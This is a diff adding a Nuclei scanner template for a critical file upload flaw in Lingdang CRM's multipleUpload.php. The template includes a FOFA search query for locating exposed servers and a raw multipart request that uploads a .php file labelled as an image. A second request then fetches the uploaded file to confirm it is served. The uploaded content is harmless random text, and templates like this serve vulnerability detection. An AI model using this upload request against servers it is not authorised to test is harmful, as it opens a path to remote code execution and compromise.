@@ -1,0 +1,55 @@
+id: ldcrm-multipleupload-fileupload
+
+info:
+  name: Lingdang CRM multipleUpload - File Upload
+  author: qwtd
+  severity: critical
+  description: |
+    灵当CRM系统接口multipleUpload文件上传漏洞，允许攻击者上传恶意文件到服务器，可能导致远程代码执行、网站篡改或其他形式的攻击，严重威胁系统和数据安全。
+  reference:
+    - https://mp.weixin.qq.com/s/usF_qKzn6mTaQ_E6I3LkVw
+  classification:
+    cwe-id: CWE-434
+  metadata:
+    max-request: 1
+    fofa-query: body="crmcommon/js/jquery/jquery-1.10.1.min.js" || (body="http://localhost:8088/crm/index.php" && body="ldcrm.base.js")
+    verified: true
+  tags: 灵当CRM
+
+variables:
+  file_name: "{{to_lower(rand_text_alpha(8))}}"
+  file_content: "{{to_lower(rand_text_alpha(20))}}"
+  rboundary: "{{to_lower(rand_text_alpha(16))}}"
+
+http:
+  - raw:
+      - |+
+        POST /crm/modules/Home/multipleUpload.php?myatt_id=1&myatt_moduel=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+        
+        ------WebKitFormBoundary{{rboundary}}
+        Content-Disposition: form-data; name="file"; filename="{{file_name}}.php"
+        Content-Type: image/png
+        
+        {{file_content}}
+        ------WebKitFormBoundary{{rboundary}}--
+
+      - |
+        GET /crm/{{path}}{{file_name}}.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Accept-Encoding: gzip
+
+    extractors:
+      - type: json
+        part: body
+        name: path
+        json:
+          - '.path'
+        internal: true
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 200 && status_code_2 == 200 && contains(body_2, '{{file_content}}')"
